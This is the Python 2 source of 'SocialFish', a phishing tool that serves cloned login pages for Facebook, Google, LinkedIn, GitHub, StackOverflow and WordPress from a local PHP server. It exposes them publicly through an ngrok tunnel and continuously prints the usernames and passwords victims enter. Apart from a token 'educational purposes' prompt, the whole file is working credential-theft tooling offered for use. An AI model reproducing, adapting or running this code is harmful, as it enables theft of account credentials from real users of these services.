#-*- coding: utf-8 -*-
#       SOCIALFISH
#     by: Technical Dada
#
###########################
from time import sleep
from sys import stdout, exit
from os import system, path
import multiprocessing
from urllib import urlopen
from platform import architecture
from wget import download

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'

def connected(host='http://duckduckgo.com'):
    try:
        urlopen(host)
        return True
    except:
        return False
if connected() == False:
     print '''
  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _ 
      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
          \|           
                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
'''.format(RED, END)
     exit(0)

def checkNgrok():
    if path.isfile('Server/ngrok') == False: 
        print '[*] Downloading Ngrok...'
        if architecture()[0] == '64bit':
            filename = 'ngrok-stable-linux-arm.zip'
        else:
            filename = 'ngrok-stable-linux-arm.zip'
        url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
        download(url)
        system('unzip ' + filename)
        system('mv ngrok Server/ngrok')
        system('rm -Rf ' + filename)
        system('clear')
checkNgrok()

def end():
    system('clear')
    print '''
                   S O C I A L{2} 
              |\    \ \ \ \ \ \ \      __           ___
              |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
              |   >----|-|-|-|-|-|-|--|  __/   /   {1}DON'T{2}   )
              |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
              |/     / / / / / / /             \_   {1}ME !{2}  _)
                          {1}F I S H{2}                ~--___--~

{1}[ {0}Watch us on YouTube:{1} https://www.youtube.com/channel/UCEYp5dNTfuemzPdVxj2T9bw ]

[ {0}Follow mt Blog:{1} http://technicaldada.in ]

[ {0}Contribute on Github:{1} https://github.com/technicaldada/SocialFish ]\n'''.format(GREEN, END, CYAN)

def loadModule(module):
       print '''{0}
   _.-=-._     .-, 
 .'       "-.,' / 
(          _.  < 
 `=.____.="  `._\\


 [{1}*{0}]{1} %s module loaded.{0}'''.format(CYAN, END) % module

def runPhishing(social, option2):
    system('rm -Rf Server/www/*.* && touch Server/www/cat.txt')
    if option2 == '1' and social == 'Facebook':
        system('cp WebPages/fb_standard/*.* Server/www/')
    if option2 == '2' and social == 'Facebook':
        system('cp WebPages/fb_advanced_poll/*.* Server/www/')
    elif option2 == '1' and social == 'Google':
        system('cp WebPages/google_standard/*.* Server/www/')
    elif option2 == '2' and social == 'Google':
        system('cp WebPages/google_advanced_poll/*.* Server/www/')   
    elif social == 'LinkedIN':
        system('cp WebPages/linkedin/*.* Server/www/')
    elif social == 'Github':
        system('cp WebPages/github/*.* Server/www/')
    elif social == 'StackOverflow':
        system('cp WebPages/stackoverflow/*.* Server/www/')
    elif social == 'WordPress':
        system('cp WebPages/wordpress/*.* Server/www/')

def waitCreds():
    print " {0}[{1}*{0}]{1} Waiting for credentials... \n".format(GREEN, END)
    while True:
        with open('Server/www/cat.txt') as creds:
            lines = creds.read().rstrip()
        if len(lines) != 0: 
            print ' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, END) % lines
            system('rm -rf Server/www/cat.txt && touch Server/www/cat.txt')
        creds.close()

def runPEnv():
    system('clear')
    print '''           {2}-{1} Technical Dada {2}|{1} technicaldada.in {2}|{1}  {2}- INDIA
                          '
                        '   '
                      '       '
                 .  '  .        '                        '
             '             '      '                   '   '
  (  ____ (  ___  |  ____ \__   __(  ___  | \        (  ____ \__   __(  ____ \\     /|
| (    \/ (   ) | (    \/  ) (  | (   ) | (        | (    \/  ) (  | (    \/ )   ( |
| (_____| |   | | |        | |  | (___) | |        | (__      | |  | (_____| (___) |
(_____  ) |   | | |        | |  |  ___  | |        |  __)     | |  (_____  )  ___  |
      ) | |   | | |        | |  | (   ) | |        | (        | |        ) | (   ) |
/\____) | (___) | (____/\__) (__| )   ( | (____/\  | )     ___) (__/\____) | )   ( |
\_______|_______|_______|_______//     \(_______/  |/      \_______|_______)/     \|
      .    '   '....'               ..'.      ' .
         '  .                     .     '          '     '  {1}v2.0{2} 
               '  .  .  .  .  . '.    .'              '  .
                   '         '    '. '      {1}Website: https//technicaldada.in{2}    
                     '       '      '             
                       ' .  '
                           '
                             {1}'''.format(GREEN, END, CYAN)

    for i in range(101):
        sleep(0.01)
        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, END) % i)
        stdout.flush()
   
    print "\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, END) 
    if 256 != system('which php'):
        print " --{0}>{1} OK.".format(CYAN, END)
    else:
	print " --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again. http://www.php.net/".format(RED, END)
        exit(0)
    if raw_input(" {0}[{1}!{0}]{1} Do you will use this tool only for educational purposes? (y/n)\n {2}SF > {1}".format(RED, END, CYAN)).upper() == 'N':
        system('clear')
        print '\n[ {0}YOU ARE NOT ALLOWED TO USE THIS TOOL{1} ]\n'.format(RED, END)
        exit(0)
    option = raw_input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIN\n\n {0}[{1}4{0}]{1} Github\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}SF >  {1}".format(CYAN, END))
    if option == '1':
        loadModule('Facebook')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
        runPhishing('Facebook', option2)
    elif option == '2':
        loadModule('Google')
        option2 = raw_input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}SF > {1}".format(CYAN, END))
        runPhishing('Google', option2)
    elif option == '3':
        loadModule('LinkedIN')
        option2 = ''
        runPhishing('LinkedIN', option2)
    elif option == '4':
        loadModule('Github')
        option2 = ''
        runPhishing('Github', option2)
    elif option == '5':
        loadModule('StackOverflow')
        option2 = ''
        runPhishing('StackOverflow', option2)
    elif option == '6':
        loadModule('WordPress')
        option2 = ''
        runPhishing('WordPress', option2)
    else:
        exit(0)

def runNgrok():
    system('./Server/ngrok http 8080 > /dev/null &')
    sleep(10)
    system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
    url = open('ngrok.url', 'r')
    print('\n {0}[{1}*{0}]{1} Ngrok URL: {2}' + url.readlines()[0] + '{1}').format(CYAN, END, GREEN)
    url.close()

def runServer():
    system("cd Server/www/ && php -S 127.0.0.1:8080")

if __name__ == "__main__":
    try:
        runPEnv()
        runNgrok()
        multiprocessing.Process(target=runServer).start()
        waitCreds()
    except KeyboardInterrupt:
        system('pkill -f ngrok')
        end()
        exit(0)
